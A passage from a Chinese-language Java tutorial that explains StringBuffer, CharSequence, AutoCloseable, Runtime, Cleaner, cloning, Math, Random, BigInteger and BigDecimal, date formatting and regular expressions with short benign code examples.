&#125;&#125;\n\n​    2、删除指定范围的数据:\npublic class Test22 &#123;    public static void main(String[] args) &#123;        StringBuffer buf = new StringBuffer();        buf.append(&quot;mes9s0!!&quot;).delete(6,8);//mes9s0        System.out.println(buf);    &#125;&#125;\n\n​    3、字符串内容反转（最大特征）:\npublic class Test22 &#123;    public static void main(String[] args) &#123;        StringBuffer buf = new StringBuffer();        buf.append(&quot;mes9s0&quot;);        System.out.println(buf.reverse());    &#125;&#125;\n\n​    实际上与  StringBuffer 类还有一个类似的功能类: StringBuilder 类.这个类是在 JDK1.5 的时候提供的，该类中提供的方法与 StringBuffer 功能相同，最大的区别在于 StringBuffer 类中的方法属于线程安全的，全部使用了 synchronized 关键字进行标注，而 StringBuilder 类属于非线程安全的。\n​    String、StringBuffer、StringBuilder 的区别：1、String 类是字符串的首选类型，其最大的特点是内容不允许修改；2、StringBuffer 与 StringBuilder 类的内容允许修改；3、StringBuffer 是在 JDK 1.0 的时候提供的，属于线程安全的操作,而 StringBuilder 是在 JDK 1.5 之后提供的,不属于线程安全的操作。\nCharSequence接口​    CharSequence 是一个描述字符串结构的接口,在这个接口里面一般发现有三种常用子类：String 类、StringBuffer 类、StringBuilder 类。\n​    三者的定义结构都与 CharSequence 接口有关。String 是首选，String Buffer 不仅是 CharSequence 的一个子类，接受 CharSequence ，同样StringBufffer 也可以。\n​    子类关系：\n\n​    现在只要有字符串就可以为CharSequence接口实例化。\n​    所以字符串加入公共的描述类型，就是 CharSequence ，只要有字符串，就可以被 CharSequence 接口识别化，所有的字符串都可以这样接收。\npublic class Test22 &#123;    public static void main(String[] args) &#123;        CharSequence str = &quot;mes9s0&quot;; //子类实例向父接口转型    &#125;&#125;\n\n​    CharSequence 本身是一个接口，在该接口之中也定义有如下操作方法:\n获取指定索引字符：public char charAt(int index);获取字符串的长度：public int length();截取部分字符串：public CharSequence subSequence(int start, int end);\n\n范例：截取字符串\npublic class Test22 &#123;    public static void main(String[] args) &#123;        CharSequence str = &quot;mes9s0&quot;; //子类实例向父接口转型        CharSequence sub = str.subSequence(4,6);        System.out.println(sub);//s0    &#125;&#125;\n\n​    所以以后只要看见了 CharSequence 描述的就是一个字符串。\nAutoCloseable接口​    AutoCloseable 主要是用于日后进行资源开发的处理上，以实现资源的自动关闭（释放）。例如：在以后进行文件、网络、数据库开发的过程之中由于服务器的资源有限，所以使用之后一定要关闭资源，这样才可以被更多的使用者所使用。\n​    为了更好的说明资源的问题，将通过一个消息的发送处理来完成。\n范例：手工实现资源处理\npackage three;//AutoCloseable接口interface IMessage &#123;    public void send(); //消息发送&#125;class NetMessage implements IMessage &#123; //实现消息的处理机制    private String msg;    public NetMessage(String msg) &#123;        this.msg = msg;    &#125;    public boolean open() &#123; //获取资源链接        System.out.println(&quot;【open】获取消息发送连接资源&quot;);        return true;    &#125;    public void close() &#123;        System.out.println(&quot;【close】关闭消息发送通道&quot;);    &#125;    @Override    public void send() &#123;        if (this.open()) &#123;            System.out.println(&quot;【*** 发送消息 ***】&quot; + this.msg);        &#125;    &#125;&#125;public class Test23 &#123;    public static void main(String[] args) &#123;        NetMessage nm = new NetMessage(&quot;mes9s0&quot;);        nm.send();        nm.close();    &#125;&#125;\n\n​    此时实现了一个模拟代码的处理流程，但有个问题，既然所有的资源完成处理之后都必须进行关闭操作，那么能否实现一种自动关闭的功能呢？在这样的要求下，推出了 AutoCloseable  访问接口，这个接口是在 JDK1.7  的时候提供的，并且该接口只提供有一个方法。\n关闭方法: public void close() throws Exception；\n\n​    \n​    按照图上的分析，我们这么写应该就可以自动关闭\npackage three;//AutoCloseable接口interface IMessage &#123;    public void send(); //消息发送&#125;class NetMessage implements IMessage, AutoCloseable &#123; //实现消息的处理机制    private String msg;    public NetMessage(String msg) &#123;        this.msg = msg;    &#125;    public boolean open() &#123; //获取资源链接        System.out.println(&quot;【open】获取消息发送连接资源&quot;);        return true;    &#125;    @Override    public void send() &#123;        if (this.open()) &#123;            System.out.println(&quot;【*** 发送消息 ***】&quot; + this.msg);        &#125;    &#125;    @Override    public void close() throws Exception &#123;        System.out.println(&quot;【close】关闭消息发送通道&quot;);    &#125;&#125;public class Test23 &#123;    public static void main(String[] args) throws Exception&#123;        NetMessage nm = new NetMessage(&quot;mes9s0&quot;);        nm.send();    &#125;&#125;\n\n\n​    要想实现自动关闭处理，除了要使用AutoCloseable之外，还需要结合异常处理完成才可以。\n\n范例：实现自动关闭处理\npackage three;//AutoCloseable接口interface IMessage extends AutoCloseable &#123;    public void send(); //消息发送&#125;class NetMessage implements IMessage &#123; //实现消息的处理机制    private String msg;    public NetMessage(String msg) &#123;        this.msg = msg;    &#125;    public boolean open() &#123; //获取资源链接        System.out.println(&quot;【open】获取消息发送连接资源&quot;);        return true;    &#125;    @Override    public void send() &#123;        if (this.open()) &#123;            System.out.println(&quot;【*** 发送消息 ***】&quot; + this.msg);        &#125;    &#125;    @Override    public void close() throws Exception &#123;        System.out.println(&quot;【close】关闭消息发送通道&quot;);    &#125;&#125;public class Test23 &#123;    public static void main(String[] args) throws Exception &#123;        try (IMessage nm = new NetMessage(&quot;mes9s0&quot;)) &#123;            nm.send();        &#125; catch (Exception e) &#123;            ;        &#125;    &#125;&#125;\n\n​    在整个的过程中，只有结合了 AutoCloseable ，整个程序才能实现自动的Close 调用，这种操作形式是在 JDK1.7 之后新增的处理，在以后的章节之中会接触到资源的关闭问题，往往都会见到 AutoCloseable 接口的使用。\n​    这个接口要和异常捆绑在一起明确使用才能正确完成。\nRuntime类​    Runtime 描述的是运行时的状态，也就是说在整个的 JVM 之中，Runtime 类是唯一一个与 JVM 运行状态有关的类，并且都会默认提供有一一个该类的实例化对象。\n​    由于在最每一个 JVM 进程里面只允许提供有一个 Runtime 类的对象，所以这个类的构造方法被默认私有化了，那么就证明该类使用的是单例设计模式，并且单例设计模式一定会提供有一个 static 方法获取本类。\n​    以下是 Runtime 类的主要操作形式。\n\n​    由于 Runtime 类属于单例设计模式，如果要想获取实例化对象，那么就可以依靠类中的 getRuntime() 方法完成:\n获取实例化对象: public static Runtime getRuntime();\n\n​    通过这个类中的 availableProcessors 方法可以获取本机的 CPU 内核数.\n范例:获取Runtime类对象\npackage three;public class Test24 &#123;    public static void main(String[] args) &#123;        Runtime run = Runtime.getRuntime(); //获取实例化对象        System.out.println(run.availableProcessors());//10    &#125;&#125;\n\n​    但是除了以上的方法之外，在 Runtime 类里面还提供有以下四个重要的操作方法:\n获取最大可用内存空间: public long maxMemory()默认的配置为本机系统的4分之 1。获取可用内存空间: public long totalMemory()默认的配置为本机系统的64分之 1。获取空闲内存空间: public long freeMemory()手工进行GC处理:public void gc()\n\npackage three;public class Test24 &#123;    public static void main(String[] args) &#123;        Runtime run = Runtime.getRuntime(); //获取实例化对象        System.out.println(run.availableProcessors());        System.out.println(&quot;1、MAX_MEMORY: &quot;+run.maxMemory());        System.out.println(&quot;2、TOTAL_MEMORY: &quot;+run.totalMemory());        System.out.println(&quot;3、FREE_MEMORY：&quot;+run.freeMemory());    &#125;&#125;\n\n\n​    4294967296/1024/1024/1024\npackage three;public class Test24 &#123;    public static void main(String[] args) throws InterruptedException &#123;        Runtime run = Runtime.getRuntime(); //获取实例化对象        System.out.println(run.availableProcessors());        System.out.println(&quot;【1】、MAX_MEMORY: &quot; + run.maxMemory());        System.out.println(&quot;【1】、TOTAL_MEMORY: &quot; + run.totalMemory());        System.out.println(&quot;【1】、FREE_MEMORY：&quot; + run.freeMemory());        String str = &quot;&quot;;        for (int x = 0;x&lt;3000;x++)&#123;            str += x;  // 产生大量的垃圾空间        &#125;        System.out.println(&quot;【2】MAX_MEMORY:&quot; + run.maxMemory());        System.out.println(&quot;【2】TOTAL_MEMORY:&quot; + run.totalMemory());        System.out.println(&quot;【2】FREE MEMORY;&quot; + run.freeMemory());        Thread.sleep(200);        run.gc();        System.out.println(&quot;【3】MAX_MEMORY:&quot; + run.maxMemory());        System.out.println(&quot;【3】TOTAL_MEMORY:&quot; + run.totalMemory());        System.out.println(&quot;【3】FREE_MEMORY:&quot; + run.freeMemory());    &#125;&#125;\n\n\n​    什么是 GC？如何处理？\n​    GC（Garbage Collector) 垃圾收集器，是可以由系统自动调用的垃圾释放功能，或者使用 Runtime 类的 gc()手工调用。\nSystem类​    System 类是一直陪伴着我们学习的程序类，之前使用的系统输出采用的就是System 类中的方法，而后在 System 类里面也定义有一些其它的处理方法。\n数组拷贝：public static void arraycopy(Object sre. int srcPos, Object dest, int destPos, int length);获取当前的日期时间数值：public static long currentTimeMillis();进行垃圾回收：public static void gc();\n\n范例：操作耗时的统计\npackage three;public class Test25 &#123;    public static void main(String[] args) &#123;        long start = System.currentTimeMillis();        String str = &quot;&quot;;        for (int x = 0; x &lt; 3000; x++) &#123;            str += x;        &#125;        long end = System.currentTimeMillis();        System.out.println(&quot;耗时： &quot; + (end - start));//87    &#125;&#125;\n\n​    在 System 类里面会发现也提供有一个 gc()方法:\n    \n​    但是这个 gc() 方法并不是重新定义的新方法，而是继续调用了 Runtime 类中的 gc() 操作 （Runtime getRuntime().gc();）。\nCleaner类​    Cleaner 是在 JDK 1.9 之后提供的一个对象清理操作，其主要的功能是进行 finialize() 方法的替代。\n​    在 C++ 语言里面有两种特殊的函数：构造函数、析构函数(对象手工回收)，在 Java里面所有的垃圾空间都是通过 GC 自动回收的，所以很多情况下是不需要使用这类析构函数的，也正是因为如此，所以 Java 并没有提供这方面支持。\n​    但是 Java 本身依然提供了给用户收尾的操作，每一个实例化对象在回收之前至少给它一个喘息的机会，最初实现对象收尾处理的方法是 Object 类中所提供的 finalize()方法，这个方法的定义如下：\n@Deprecated(since=&quot;9&quot;)protected void finalize() throws Throwable\n\n​    该替换指的是不建议继续使用这个方法了，而是说子类可以继续使用这个方法名称。\n​    但是这个方法上最大的特点是抛出了一个 Throwable 异常类型，而这个异常类型分为两个子类型：Error、Exception，平常所处的都是 Exception。\n范例：观察传统回收\npackage three;class Member&#123;    public Member()&#123;        System.out.println(&quot;在一个雷电交加的日子里，林强诞生&quot;);    &#125;    @Override    protected void finalize() throws Throwable&#123;        System.out.println(&quot;【回收】最终你一定要死的&quot;);        throw new Exception(&quot;我还要再活500年&quot;);    &#125;&#125;public class Test26 &#123;    public static void main(String[] args) &#123;        Member mem = new Member(); //诞生        mem = null; //成为垃圾        System.gc();        System.out.println(&quot;太阳照常升起&quot;);    &#125;&#125;\n\n​    但是从 JDK 1.9  开始，这操作已经不建议使用了，而对于对象回收释放。从 JDK1.9 开始建议开发者使用 AutoCloseable 或者使用 java.lang .ref.Cleaner 类进行回收处理( Cleaner 也支持有 AutoCloseable 处理)。\npackage three;import java.lang.ref.Cleaner;class Member implements Runnable &#123;    public Member() &#123;        System.out.println(&quot;【构造】在一个雷电交加的日子里，林强诞生&quot;);    &#125;    @Override    public void run() &#123; //执行清楚的时候执行的是此操作        System.out.println(&quot;【回收】最终一定要死的&quot;);    &#125;&#125;class MemberCleaning implements AutoCloseable &#123; //实现清楚的处理    private static final Cleaner cleaner = Cleaner.create(); //创建一个清除处理    private Member member;    private Cleaner.Cleanable cleanable;    public MemberCleaning() &#123;        this.member = new Member(); //创建新对象        this.cleanable = this.cleaner.register(this, this.member); //注册使用的对象    &#125;    @Override    public void close() throws Exception &#123;        this.cleanable.clean(); //启动多线程    &#125;&#125;public class Test26 &#123;    public static void main(String[] args) throws Exception &#123;        try(MemberCleaning mc = new MemberCleaning())&#123;            //执行相关代码        &#125;catch (Exception e)&#123;            ;        &#125;    &#125;&#125;\n\n​    在新一代的清楚回收处理的过程之中，更多的情况下考虑的是多线程的使用，即：为了防止有可能造成的延迟处理，所以许多对象回收前的处理都是通过单独一个线程完成的。\n对象克隆​    所谓的对象克隆指的就是对象的复制，而且属于全新的复制。即:使用已有对象内容创建一个新的对象，如果要想进行对象克隆需要使用到 Object 类中提供的 clone()\nprotected Object clone( ) throws CloneNotSupportedException;\n\n​    所有的类都会继承 Object 父类，所以所有的类都一定会有 clone() 方法，但是并不是所有的类都希望被克隆。\n​    所以如果要想实现对象克隆，那么对象所在的类需要实现一个 Cloneable 接口，此接口并没有任何的方法提供，是因为它描述的是一种能力。\n实现对象克隆错误案例\npackage three;class Member1 implements Cloneable &#123;    private String name;    private int age;    public Member1(String name, int age) &#123;        this.name = name;        this.age = age;    &#125;    @Override    public String toString() &#123;        return &quot;【 &quot; + super.toString() + &quot;】name=&quot; + this.name + &quot;、age = &quot; + this.age;    &#125;&#125;public class Test27 &#123;    public static void main(String[] args) &#123;        Member1 memberA = new Member1(&quot;林强&quot;, 30);        memberA.clone();    &#125;&#125;\n\n​    这是错误的代码，memberA.clone这里肯定是没办法克隆的，因为这是一个protected方法，修改一下\npackage three;class Member1 implements Cloneable &#123;    private String name;    private int age;    public Member1(String name, int age) &#123;        this.name = name;        this.age = age;    &#125;    @Override    public String toString() &#123;        return &quot;【 &quot; + super.toString() + &quot;】name=&quot; + this.name + &quot;、age = &quot; + this.age;    &#125;    @Override    protected Object clone() throws CloneNotSupportedException &#123;        return super.clone(); //调用父类中提供的clone()方法    &#125;&#125;public class Test27 &#123;    public static void main(String[] args) throws CloneNotSupportedException &#123;        Member1 memberA = new Member1(&quot;林强&quot;, 30);        Member1 memberB = (Member1) memberA.clone();        System.out.println(memberA);        System.out.println(memberB);    &#125;&#125;\n\n​    如果在开发之中不是非常特别的需求下，很少会出现有对象克隆的需求。\n\n数字操作类​    程序就是一个数学的处理过程，所以在 Java 语言本身也提供有相应的数字处理的类库支持。\nMath数学计算类​    Math 类的主要功能是进行数学计算的操作类，提供有基础的计算公式。\n    \n​    这个类的构造方法被私有化了但是不是单例设计模式，而且该类之中提供的所有方法都是 static 型的方法，即:这些方法都可以通过类名称直接调用。\n//Math数学计算类package three;public class Test28 &#123;    public static void main(String[] args) &#123;        System.out.println(Math.abs(-10.1));        System.out.println(Math.max(10.2, 10.3));        System.out.println(Math.log(5));        System.out.println(Math.round(-15.5));        System.out.println(Math.round(-15.6));        System.out.println(Math.pow(10.2, 20.2)); //10的20次方    &#125;&#125;\n\n\n​    虽然在 Math 类里面提供有四舍五入的处理方法,但是这个四舍五入字在进行处理的时候是直接将小数点后的所有位进行处理了，这样肯定不方便，那么现在最方便的做法是可以实现指定位数的保留。\n范例：自定义的四舍五入的功能\n//Math数学计算类package three;class MathUtil &#123;    private MathUtil() &#123;    &#125;    /**     * 实现四舍五入操作     *     * @param num   要进行四舍五入操作的数字     * @param scale 四舍五入保留的小数位数     * @return 四舍五入处理后的结果     */    public static double round(double num, int scale) &#123;        return Math.round(num * Math.pow(10, scale)) / Math.pow(10, scale);    &#125;&#125;public class Test28 &#123;    public static void main(String[] args) &#123;        System.out.println(MathUtil.round(19.8673, 2));    &#125;&#125;\n\n​    Math 类里面提供的基本上都是基础的数学公式，需要的时候需要自己重新整合。\nRandom随机数生成类​    java.util.Random 类的主要功能：java.util.Random 类的主要功能是产生随机数，这个类主要是依靠内部提供的方法来完成。\n​    我们看看文档里面有一个重要的方法:\n\npublic int nextInt(int bound)\n\n​    public int nextInt(int bouhd):产生一个不大于边界的随机正整数,带0\npackage three;//Random随机数生成类import java.util.Random;public class Test29 &#123;    public static void main(String[] args) &#123;        Random rand = new Random();        for (int x = 0; x &lt; 10; x++) &#123;            System.out.print(rand.nextInt(10) + &quot;、&quot;);        &#125;    &#125;&#125;\n\n\n范例：随机生成36选7彩票号（不能出现0且不重复）\npackage three;//Random随机数生成类import java.util.Arrays;import java.util.Random;public class Test29 &#123;    public static void main(String[] args) &#123;        int data[] = new int[7];//开辟7个大小的空间        Random rand = new Random();        int foot = 0; //操作data脚标        while (foot &lt; 7) &#123; //选择7个数字            int num = rand.nextInt(37); //生成一个数字            if (isUse(num, data)) &#123; //判断是否可以使用                data[foot++] = num; //保存数据            &#125;        &#125;        Arrays.sort(data);        for (int datum : data) &#123;            System.out.print(datum + &quot;、&quot;);        &#125;    &#125;    /**     * 判断传入的数字是否为日以及是否在数组之中存在     *     * @param num  要判断的数字     * @param temp 已经存在的数据     * @return 如果该数字不是0并且可以使用返回true, 否则false     */    public static boolean isUse(int num, int temp[]) &#123;        if (num == 0) &#123;            return false;        &#125;        for (int x = 0; x &lt; temp.length; x++) &#123;            if (num == temp[x]) &#123;                return false;            &#125;        &#125;        return true;    &#125;&#125;\n\n​    以后这种随机的操作都可以利用Random来处理\n大数字处理​    在进行数学计算的过程里面还有一个大数字的操作类，可以实现实现海量数字的计算（能提供的也只是基础计算)，现在假设一个数字很大，超过了double范围。那么这个时候没有一个数据类型可以保存下此类的内容，最早的时候只能够通过String保存。\nString strA = &quot;120&quot;;String strB = &quot;230&quot;;\n\n​    如果现在要想进行加法计算，那么就需要逐位拆分，每一位自己计算，而后自己独立控制进位处理，那么这样的开发难度非常高，所以为了解决这类问题，提供有两个大数字的操作类：BigInteger、BigDecimal\npublic class BigInteger extends Number implements Comparable&lt;BigInteger&gt;\n\n​    我们可以发现是继承的Number类，那么我们可以完善下包装类\n\n​    之前分析了，当数字很大的时候只能够利用字符串描述数字操作，所以这一点可以观察两个大数字操作类的构造方法：\nBigInteger 类构造：public BigInteger(String val);BigDecimal 类构造：public BigDecimal(String val);\n\n​    \n\n范例：使用 BigInteger 进行四则运算\npackage three;import java.math.BigInteger;public class Test30 &#123;    public static void main(String[] args) &#123;        BigInteger bigA = new BigInteger(&quot;234234234234234234&quot;);        BigInteger bigB = new BigInteger(&quot;23423423&quot;);        System.out.println(&quot;加法操作：&quot;+bigA.add(bigB));        System.out.println(&quot;减法操作：&quot;+bigA.subtract(bigB));        System.out.println(&quot;乘法操作：&quot;+bigA.multiply(bigB));        System.out.println(&quot;除法操作：&quot;+bigA.divide(bigB));    &#125;&#125;\n\n\n​    需要注意的是，虽然提供有大数字类处理方法，但仍然需要考虑性能问题.\npackage three;import java.math.BigInteger;public class Test30 &#123;    public static void main(String[] args) &#123;        BigInteger bigA = new BigInteger(&quot;234234234234234234&quot;);        BigInteger bigB = new BigInteger(&quot;23423423&quot;);        System.out.println(bigA.pow(Integer.MAX_VALUE));     &#125;&#125;\n\n​    此时的计算过程是非常缓慢的，所以任何的电脑都是有极限的。既然在进行数学除法的时候无法进行整除的处理，那么就可以使用其它的除法计算来求出余数:\n求余：Public BigInteger[] divide AndRemainder(BigInteger val)数组第一个元素为商，第二个为余数\n\n范例：求余除法\npackage three;import java.math.BigInteger;public class Test30 &#123;    public static void main(String[] args) &#123;        BigInteger bigA = new BigInteger(&quot;234234234234234234&quot;);        BigInteger bigB = new BigInteger(&quot;23423423&quot;);        BigInteger[] result = bigA.divideAndRemainder(bigB);        System.out.println(&quot;商：&quot; + result[0] + &quot;、余数：&quot; + result[1]);//商：10000000180、余数：18018094    &#125;&#125;\n\n​    如果在计算时没有超过基本数据类型所包含的位数强烈不建议使用大数字处理类方法，因为性能很低。\n​    BieDecimal 操作形式和 Bielnteger 是非常类似的，都有基础的数学支持。\n范例：使用 BigDecimal  计算\n//大数据计算package three;import java.math.BigDecimal;import java.math.BigInteger;public class Test30 &#123;    public static void main(String[] args) &#123;        BigDecimal bigA = new BigDecimal(&quot;3254562624653745&quot;);        BigDecimal bigB = new BigDecimal(&quot;322344&quot;);        System.out.println(&quot;加法计算：&quot; + bigA.add(bigB));        BigDecimal[] result = bigA.divideAndRemainder(bigB);        System.out.println(&quot;除法计算，商：&quot; + result[0] + &quot;余数：&quot; + result[1]);    &#125;&#125;\n\n\n​    但是在使用 BigDecimal 的时候有一个数据进位问题，在这个类里面定义有如下的一个除法计算，可以看到在1.9之后就过期了，所以我们必须解决掉这个问题：\npublic BigDecimal divide(BigDecimal divisor,int scale,RoundingMode roundingMode)\n\n\nclass MathUtil1 &#123;    private MathUtil1() &#123;&#125;    /**     * 实现四舍五入操作     *     * @param num   要进行四舍五入操作的数字     * @param scale 四舍五入保留的小数位数     * @return 四舍五入处理后的结果     */    public static double round(double num, int scale) &#123;        return new BigDecimal(num).divide(new BigDecimal(1.0),scale, RoundingMode.HALF_UP).doubleValue();    &#125;&#125;\n\n​    我们分析一下核心语句：\n​    首先将double型的num封装在BigDecimal里，因为BigDecimal有一个divide方法，那么任何数字除以1.0的时候都是它本身，所以在方法里封装一个BigDecimal(1.0)。RoundingMode.HALF_UP是向上进位。而这一个整体的返回值是BigDecimal，BigDecimal是Number的子类，所以可以使用doubleValue()处理。\n范例：使用 BigDecimal 实现四舍五入处理\n//大数据计算package three;import java.math.BigDecimal;import java.math.RoundingMode;class MathUtil1 &#123;    private MathUtil1() &#123;    &#125;    /**     * 实现四舍五入操作     *     * @param num   要进行四舍五入操作的数字     * @param scale 四舍五入保留的小数位数     * @return 四舍五入处理后的结果     */    public static double round(double num, int scale) &#123;        return new BigDecimal(num).divide(new BigDecimal(&quot;1.0&quot;), scale, RoundingMode.HALF_UP).doubleValue();    &#125;&#125;public class Test30 &#123;    public static void main(String[] args) &#123;        System.out.println(MathUtil1.round(19.6352, 2)); //19.64    &#125;&#125;\n\n​    BigDecimal 与 Math 相比，Math 的处理由于使用的都是基本数据类型，所以性能高于大数字处理类 BigDecimal。\n\n日期操作类Date日期处理类​    从整体的 java 来讲一直在强调简单 java 类的主要设计来自于数据表的结构，那么在数剧表的结果里面常用的类型:字符串、日期，所以现在的程序之中只差日期了。\n 在 Java 里面提供有一个 java.util.Date 的类，这个类如果直接实例化就可以获取当前的日期时间。\n\n范例:观察 Java.util.Date 类\n//Data类package three;import java.util.Date;public class Test31 &#123;    public static void main(String[] args) &#123;        Date date = new Date();        System.out.println(date); //Wed Sep 21 11:33:17 CST 2022    &#125;&#125;\n\n​    不适合阅读，这个时候需要进一步去观察 Date 类中的构造方法：\npublic Date() &#123; this(System.currentTimeMillis()); &#125;public Date(long date) &#123; fastTime = date; &#125;\n\n​    通过以上的源代码分析可以得出一个结论: Date 类中只是对 long 数据的一种包装。所以 date 类中一定提供所谓的日期与 long 数据类型之间转换的方法，这两个方法非常重要:\n将 long 转为日期: public date（long date）；将 Date 转为long: public long getTime（）；\n\n范例:观察 Date 与 long 的转换\n//Data类package three;import java.util.Date;public class Test31 &#123;    public static void main(String[] args) &#123;        Date data = new Date();        long current = data.getTime();        current += 864000 * 1000;//10天        System.out.println(new Date(current));    &#125;&#125;\n\n\n​    long 之中可以保存毫秒的数据级，这样方便程序处理。\n日期格式化​    虽然 date 可以获取当前的日期时间，但是默认情况下 Date 类输出的日期结构并不能够被国人所习惯，那么现在就需要对显示的格式进行格式化处理，为了可以格式化日期，在 java.text 包中提供有 SimpleDateFormat 程序类。\n​    该类是 DateFormat 的子类，在该类中提供有如下的方法:\n\n\n【DateFormat】将日期格式化: public final String format(Date date);【DateFormat继承】将字符串转为日期: public Date Parse(String source) throws ParseException;构造方法:public SimpleDateFormat（String pattern）  \t- 日期格式：年（yyyy）、月（MM）、日（dd）、时（HH）、分（mm）、秒（ss）、毫秒（SSS）\n\n范例:格式化日期显示\n//Data类package three;import java.text.SimpleDateFormat;import java.util.Date;public class Test31 &#123;    public static void main(String[] args) &#123;        Date data = new Date();        SimpleDateFormat sdf = new SimpleDateFormat(&quot;yyyy-MM-dd HH:mm:ss.SSS&quot;);        String str = sdf.format(data);        System.out.println(str);    &#125;&#125;\n\n​    除了可以将日期格式化为字符串之后，也可以实现字符串与日期之间的转换处理\n范例：将日期转为Date\n//Data类package three;import java.text.ParseException;import java.text.SimpleDateFormat;import java.util.Date;public class Test31 &#123;    public static void main(String[] args) throws ParseException &#123;        String birthday = &quot;1864-11-11 11:11:11.111&quot;;        SimpleDateFormat sdf = new SimpleDateFormat(&quot;yyyy-MM-dd HH:mm:ss.SSS&quot;);//        String str = sdf.format(data);//        System.out.println(str);        Date date = sdf.parse(birthday);        System.out.println(date);    &#125;&#125;\n\n\n​    如果在进行字符串定义的时候，所使用的日期时间数字超过了指定的合理范围，则会自动进行进位处理。\n范例：数字格式化\n//Data类package three;import java.text.NumberFormat;import java.text.ParseException;import java.text.SimpleDateFormat;import java.util.Date;public class Test31 &#123;    public static void main(String[] args) throws ParseException &#123;        double money = 283782758.23;        String str = NumberFormat.getInstance().format(money);        System.out.println(str); //283,782,758.23//        String birthday = &quot;1864-11-11 11:11:11.111&quot;;//        SimpleDateFormat sdf = new SimpleDateFormat(&quot;yyyy-MM-dd HH:mm:ss.SSS&quot;);//        Date date = sdf.parse(birthday);//        System.out.println(date);//        String str = sdf.format(data);//        System.out.println(str);    &#125;&#125;\n\n\n​    通过到现在的学习发现，String 字符串可以向所有类型转换，基本类型、日期类型。\n\n正则表达式​    通过之前的一系列的分析可以发现，String 一个非常万能的类型，因为 String 不仅仅可以支持有各种字符串的处理操作，也支持有向各个数据类型的转换功能，所以在项目的开发之中，只要是用户输入的信息基本上都可以用 String 表示。\n​    于是再向其他类型转换的时候，为了保证转换的正确性，往往需要对其进行一些复杂的验证处理，这种情况下如果只是单纯的依靠 String 类中的方法是非常麻烦的。\n认识正则表达式​    现在假设有一个字符串要求你判断字符串是否由数字组成，如果由数字所组成则将变为数字进行乘法计算。\n范例：这是一个基础验证代码\npackage three;public class Test32 &#123;    public static void main(String[] args) &#123;        String str = &quot;123&quot;;        if (isNumber(str))&#123;            int num = Integer.parseInt(str);            System.out.println(num * 2); //246        &#125;    &#125;    public static boolean isNumber(String str) &#123;        char data[] = str.toCharArray();        for (int x = 0; x &lt; data.length; x++) &#123;            if (data[x] &gt; &#x27;9&#x27; || data[x] &lt; &#x27;0&#x27;) &#123;                return false;            &#125;        &#125;        return true;    &#125;&#125;\n\n​    实际上这种验证的功能是非常简单的，但是这如此简单的功能却需要开发者编写大量程序逻辑代码那么如果是更加复杂的验证呢？那么在这样的情况下，对于验证来讲最好的做法就是利用正则表达式来完成。\n范例:使用正则表达式实现同样的效果\npackage three;public class Test32 &#123;    public static void main(String[] args) &#123;        String str = &quot;123&quot;;        if (str.matches(&quot;\\\\d+&quot;))&#123;            int num = Integer.parseInt(str);            System.out.println(num * 2); //246        &#125;    &#125;&#125;\n\n​    正则表达式最早是从 Perl 语言里面发展而来的，而后在 JDK1.4 以前如果需要使用到正则表达式的相关定义则需要单独引入其他的*. jar 文件，但是从 JDK1.4 之后，正则已经默认被 JDK 所支持，并且提供有 java.util.regex 开发包，同时针对于 String 类也提出进行了一些修改，使其可以有方法之间支持正则处理。\n 使用正则最大特点在于方便进行验证处理，以及方便进行复杂字符串的修改处理。\n\n常用正则标记（背）​    如果要想进行正则的处理操作，那么就首先需要对常用的正则标记有所掌握，从JDK1.4 开始提供有 java.util.regex 开发包，里边定义这个包里面提供有一-个Pattern 程序类，在这个程序类里面定义有所有支持的正则标记。\n​    ⒈【数量:单个】字符匹配\n​        任意字符：表示由任意字符组成\n​        \\\\ :匹配”\\“\n​        \\n :匹配换行\n​        \\t :匹配制表符\n​    ⒉【数量:单个】字符集(可以从里面任选一个字符)。\n​        [abc] :表示可能是字母 a、b、c中的任意一个;\n​        [^abc] :表示不是由字母 a、b、C中的任意-一个;\n​        [a-zA-Z] :表示由一个任意字母所组成，不区分大小写;\n​        [0-9] :表示由一位数字所组成;\n​    3、[数量:单个]简化字符集;\n​        .  :表示任意的一个字符;\n​        \\d :等价于“[0-9]”范围;\n​        D :等价于[^0-9]范围;\n​        \\s :匹配任意的一位空格，可能是空格、换行、制表符;\n​        \\S :匹配任意的非空格、换行、制表符数据;\n​        \\w :匹配字母、 数字、下划线， 等价于[a-zA-Z_0-9]\n​        \\W :匹配非字母、数字、下划线，等价于[^a-zA-Z_0-9];\n​    ⒋边界匹配:\n​        ^:匹配边界开始;\n​        $:匹配边界结束;\n​    ⒌数量表示，默认情况下只有添加上了数量单位才可以匹配多位字符;\n​        表达式? :该正则可以出现 0 次或 1 次;\n​        表达式* :该正则可以出现 0 次、1 次或多次;\n​        表达式+ :该正则可以出现 1 次或多次;\n​        表达式{n} :表达式的长度正好为 n 次;\n​        表达式{n,} :表达式的长度为 n 次以上\n​        表达式{n,m} :表达式的长度在 n~m 次;\n​    6.逻辑表达式:可以连接多个正则: \n​        XY :X 表达式之后紧跟上 Y 表达式;\n​        X｜Y :有一个表达式满足即可;\n​        (X) :为表达式设置一个整体描述， 可以为整体描述设置数量单位。\nString类对正则的支持​    在进行正则表达式大部分处理的情况下都会基于 String 类来完成，并且在 String 类里面提供有如下与正则有关的操作方法:\n\n\n\nNo.\n方法名称\n类型\n描述\n\n\n\n01\npublic boolean matches(String regex）\n普通\n将指定字符串进行正则判断。\n\n\n02\npublic String replaceAll(String regex, String replacement)\n普通\n替换全部\n\n\n03\npublic String replaceFirst(String regex, String replacement):\n普通\n替换首个\n\n\n04\npublic String[] split(String regex)\n普通\n正则拆分\n\n\n05\npublic String[] split(String regex, int limit)\n普通\n正则拆分\n\n\n​    下面通过一些具体的范例来对正则的使用进行说明。\n范例:实现字符串替换（删除掉非字母与数字）\n//String类对正则的支持,字符串替换package three;public class Test33 &#123;    public static void main(String[] args) &#123;        String str = &quot;jfhwifhaifh23i*&amp;(*YJB3iry82*(&amp;*^$^%&quot;;        String regex = &quot;[^a-zA-Z0-9]&quot;;        System.out.println(str.replaceAll(regex,&quot;&quot;));    &#125;&#125;\n\n\n范例：实现字符串的拆分\n//String类对正则的支持,字符串替换package three;public class Test33 &#123;    public static void main(String[] args) &#123;        String str = &quot;a1b22c333d4444e55555f666666g&quot;;        String regex = &quot;\\\\d+&quot;;        String[] result = str.split(regex);        for (int x = 0; x &lt; result.length; x++) &#123;            System.out.print(result[x] + &quot;、&quot;);        &#125;    &#125;&#125;\n\n\n​    在正则处理的时候对于拆分与替换的操作相对容易一些， 但是比较麻烦的是数据验证部分。\n范例:判断一个数据是否为小数，如果是小数则将其变为 double 类型\n//String类对正则的支持,字符串替换package three;public class Test33 &#123;    public static void main(String[] args) 